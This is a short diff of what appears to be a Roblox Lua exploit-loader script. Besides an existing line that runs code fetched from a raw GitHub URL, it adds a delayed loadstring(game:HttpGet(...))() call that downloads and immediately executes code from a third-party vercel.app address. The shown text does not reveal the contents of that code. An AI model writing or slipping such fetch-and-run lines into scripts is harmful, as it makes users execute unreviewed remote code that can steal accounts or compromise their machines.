@@ -13,3 +13,7 @@ else
     loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testd3"))()
 
 end
+
+
+task.wait(1)
+loadstring(game:HttpGet("https://blyatscripts.vercel.app/lo"))()
